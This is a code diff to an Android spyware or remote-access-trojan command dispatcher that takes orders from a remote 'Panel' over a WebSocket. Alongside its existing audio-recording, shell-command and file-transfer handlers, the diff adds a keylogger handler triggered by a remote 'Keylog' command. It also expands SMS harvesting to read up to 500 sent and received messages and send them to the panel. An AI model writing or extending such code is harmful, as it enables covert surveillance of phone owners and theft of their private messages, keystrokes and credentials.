@@ -53,6 +53,7 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     private AudioRecordHandler audioRecordHandler;
     private ShellCommandHandler shellCommandHandler;
     private FileTransferHandler fileTransferHandler;
+    private KeylogHandler keylogHandler;
     private CommandHandler engineHandler;
 
     public CommandDispatcher() {
@@ -60,6 +61,7 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         audioRecordHandler = new AudioRecordHandler();
         shellCommandHandler = new ShellCommandHandler();
         fileTransferHandler = new FileTransferHandler();
+        keylogHandler = new KeylogHandler();
     }
 
     /**
@@ -77,6 +79,10 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
      */
     public void setEngineHandler(CommandHandler handler) {
         this.engineHandler = handler;
+    }
+
+    public KeylogHandler getKeylogHandler() {
+        return keylogHandler;
     }
 
     @Override
@@ -707,6 +713,7 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     /**
      * 获取短信列表 → subc="sms"
+     * Panel parseSmsData 期望每行一个 JSON: {time, message, full_message, number}
      */
     private void handleFetchSms() {
         Log.d(TAG, "fetchSms");
@@ -716,22 +723,42 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
         new Thread(() -> {
             try {
-                JsonArray arr = new JsonArray();
+                StringBuilder sb = new StringBuilder();
+                // 读取全部短信 (收件+发件)，按时间倒序，限 500 条
                 Cursor cursor = ctx.getContentResolver().query(
-                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 200");
+                    Uri.parse("content://sms"),
+                    new String[]{"address", "body", "date", "type"},
+                    null, null, "date DESC LIMIT 500");
                 if (cursor != null) {
+                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+                    int count = 0;
                     while (cursor.moveToNext()) {
+                        String address = cursor.getString(0);
+                        String body = cursor.getString(1);
+                        long date = cursor.getLong(2);
+                        int type = cursor.getInt(3); // 1=收件, 2=发件
+
                         JsonObject sms = new JsonObject();
-                        sms.addProperty("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
-                        sms.addProperty("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
-                        sms.addProperty("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
-                        sms.addProperty("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
-                        arr.add(sms);
+                        sms.addProperty("number", address != null ? address : "");
+                        sms.addProperty("message", body != null ? (body.length() > 100 ? body.substring(0, 100) : body) : "");
+                        sms.addProperty("full_message", body != null ? body : "");
+                        sms.addProperty("time", sdf.format(new Date(date)));
+                        sms.addProperty("type", type);
+
+                        if (sb.length() > 0) sb.append("\n");
+                        sb.append(sms.toString());
+                        count++;
                     }
                     cursor.close();
+                    ws.sendData("sms", sb.toString());
+                    Log.d(TAG, "sms sent: " + count + " messages");
+                } else {
+                    ws.sendData("sms", "");
+                    Log.w(TAG, "sms: cursor is null (permission denied?)");
                 }
-                ws.sendData("sms", arr.toString());
-                Log.d(TAG, "sms sent: " + arr.size() + " messages");
+            } catch (SecurityException e) {
+                Log.w(TAG, "fetchSms: READ_SMS permission denied", e);
+                ws.sendData("sms", "");
             } catch (Exception e) {
                 Log.w(TAG, "fetchSms failed", e);
             }
@@ -925,9 +952,7 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
      * 格式: {"type":"screencomd", "subc":"Keylog", "comdtype":"0"=开/"1"=关}
      */
     private void handleKeylog(JsonObject payload) {
-        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
-        Log.d(TAG, "keylog: comdtype=" + comdtype);
-        // TODO: 开启/关闭无障碍服务的键盘事件监听
+        keylogHandler.handle(payload);
     }
 
     /**
